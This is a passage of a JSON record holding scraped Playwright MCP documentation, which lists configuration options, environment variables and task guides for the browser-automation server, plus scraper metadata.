'stdout';\n\n  console?: {\n    /**\n     * The level of console messages to return. Each level includes the messages of more severe levels. Defaults to \"info\".\n     */\n    level?: 'error' | 'warning' | 'info' | 'debug';\n  },\n\n  network?: {\n    /**\n     * List of origins to allow the browser to request. Default is to allow all. Origins matching both `allowedOrigins` and `blockedOrigins` will be blocked.\n     */\n    allowedOrigins?: string[];\n\n    /**\n     * List of origins to block the browser to request. Origins matching both `allowedOrigins` and `blockedOrigins` will be blocked.\n     */\n    blockedOrigins?: string[];\n  };\n\n  /**\n   * Specify the attribute to use for test ids, defaults to \"data-testid\".\n   */\n  testIdAttribute?: string;\n\n  timeouts?: {\n    /*\n     * Configures default action timeout: https://playwright.dev/docs/api/class-page#page-set-default-timeout. Defaults to 5000ms.\n     */\n    action?: number;\n\n    /*\n     * Configures default navigation timeout: https://playwright.dev/docs/api/class-page#page-set-default-navigation-timeout. Defaults to 60000ms.\n     */\n    navigation?: number;\n  };\n\n  /**\n   * Whether to allow file uploads from anywhere on the file system.\n   * By default (false), file uploads are restricted to paths within the MCP roots only.\n   */\n  allowUnrestrictedFileAccess?: boolean;\n\n  /**\n   * Specify the language to use for code generation.\n   */\n  codegen?: 'typescript' | 'none';\n}\n</code></pre> \n</details> \n<details> \n Configuration via env \n <table> \n  <thead> \n   <tr> \n    <th>Environment</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_ALLOWED_HOSTS</code> comma-separated list of hosts this server is allowed to serve from. Defaults to the host the server is bound to. Pass '*' to disable the host check.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_ALLOWED_ORIGINS</code> semicolon-separated list of TRUSTED origins to allow the browser to request. Default is to allow all. Important: <em>does not</em> serve as a security boundary and <em>does not</em> affect redirects.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_ALLOW_UNRESTRICTED_FILE_ACCESS</code> allow access to files outside of the workspace roots. Also allows unrestricted access to file:// URLs. By default access to file system is restricted to workspace root directories (or cwd if no roots are configured) only, and navigation to file:// URLs is blocked.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_BLOCKED_ORIGINS</code> semicolon-separated list of origins to block the browser from requesting. Blocklist is evaluated before allowlist. If used without the allowlist, requests not matching the blocklist are still allowed. Important: <em>does not</em> serve as a security boundary and <em>does not</em> affect redirects.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_BLOCK_SERVICE_WORKERS</code> block service workers</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_BROWSER</code> browser or chrome channel to use, possible values: chrome, firefox, webkit, msedge.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_CAPS</code> comma-separated list of additional capabilities to enable, possible values: vision, pdf.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_CDP_ENDPOINT</code> CDP endpoint to connect to.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_CDP_HEADER</code> CDP headers to send with the connect request, multiple can be specified.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_CODEGEN</code> specify the language to use for code generation, possible values: \"typescript\", \"none\". Default is \"typescript\".</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_CONFIG</code> path to the configuration file.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_CONSOLE_LEVEL</code> level of console messages to return: \"error\", \"warning\", \"info\", \"debug\". Each level includes the messages of more severe levels.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_DEVICE</code> device to emulate, for example: \"iPhone 15\"</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_EXECUTABLE_PATH</code> path to the browser executable.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_EXTENSION</code> Connect to a running browser instance (Edge/Chrome only). Requires the \"Playwright MCP Bridge\" browser extension to be installed.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_GRANT_PERMISSIONS</code> List of permissions to grant to the browser context, for example \"geolocation\", \"clipboard-read\", \"clipboard-write\".</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_HEADLESS</code> run browser in headless mode, headed by default</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_HOST</code> host to bind server to. Default is localhost. Use 0.0.0.0 to bind to all interfaces.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_IGNORE_HTTPS_ERRORS</code> ignore https errors</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_INIT_PAGE</code> path to TypeScript file to evaluate on Playwright page object</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_INIT_SCRIPT</code> path to JavaScript file to add as an initialization script. The script will be evaluated in every page before any of the page's scripts. Can be specified multiple times.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_ISOLATED</code> keep the browser profile in memory, do not save it to disk.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_IMAGE_RESPONSES</code> whether to send image responses to the client. Can be \"allow\" or \"omit\", Defaults to \"allow\".</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_NO_SANDBOX</code> disable the sandbox for all process types that are normally sandboxed.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_OUTPUT_DIR</code> path to the directory for output files.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_OUTPUT_MODE</code> whether to save snapshots, console messages, network logs to a file or to the standard output. Can be \"file\" or \"stdout\". Default is \"stdout\".</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_PORT</code> port to listen on for SSE transport.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_PROXY_BYPASS</code> comma-separated domains to bypass proxy, for example \".com,chromium.org,.domain.com\"</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_PROXY_SERVER</code> specify proxy server, for example \"<a href=\"http://myproxy:3128\">http://myproxy:3128</a>\" or \"socks5://myproxy:8080\"</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_SAVE_SESSION</code> Whether to save the Playwright MCP session into the output directory.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_SAVE_TRACE</code> Whether to save the Playwright Trace of the session into the output directory.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_SAVE_VIDEO</code> Whether to save the video of the session into the output directory. For example \"--save-video=800x600\"</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_SECRETS</code> path to a file containing secrets in the dotenv format</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_SHARED_BROWSER_CONTEXT</code> reuse the same browser context between all connected HTTP clients.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_SNAPSHOT_MODE</code> when taking snapshots for responses, specifies the mode to use. Can be \"incremental\", \"full\", or \"none\". Default is incremental.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_STORAGE_STATE</code> path to the storage state file for isolated sessions.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_TEST_ID_ATTRIBUTE</code> specify the attribute to use for test ids, defaults to \"data-testid\"</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_TIMEOUT_ACTION</code> specify action timeout in milliseconds, defaults to 5000ms</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_TIMEOUT_NAVIGATION</code> specify navigation timeout in milliseconds, defaults to 60000ms</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_USER_AGENT</code> specify user agent string</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_USER_DATA_DIR</code> path to the user data directory. If not specified, a temporary directory will be created.</td> \n   </tr> \n   <tr> \n    <td><code>PLAYWRIGHT_MCP_VIEWPORT_SIZE</code> specify browser viewport size in pixels, for example \"1280x720\"</td> \n   </tr> \n  </tbody> \n </table> \n</details> \n<h2>Specific tasks</h2> \n<p>The installed skill includes detailed reference guides for common tasks:</p> \n<ul> \n <li><strong>Request mocking</strong> — intercept and mock network requests</li> \n <li><strong>Running Playwright code</strong> — execute arbitrary Playwright scripts</li> \n <li><strong>Browser session management</strong> — manage multiple browser sessions</li> \n <li><strong>Storage state (cookies, localStorage)</strong> — persist and restore browser state</li> \n <li><strong>Test generation</strong> — generate Playwright tests from interactions</li> \n <li><strong>Tracing</strong> — record and inspect execution traces</li> \n <li><strong>Video recording</strong> — capture browser session videos</li> \n</ul>",
        "source": "mshibanami.github.io",
        "published": "",
        "fetched_at": "2026-02-09T23:33:03.745529Z",
        "tags": [
          {
            "name": "transformation",
            "score": 3
          },
          {
            "name": "boundary_crossing",
            "score": 6
          },
          {
            "name": "scale_shift",
            "score": 4
          }
        ],
        "structural_score": 13,
        "timeliness_score": 1,
        "final_score": 4.6,
        "reddit_score": null,
        "reddit_comments": null
      }
    ]
  }
}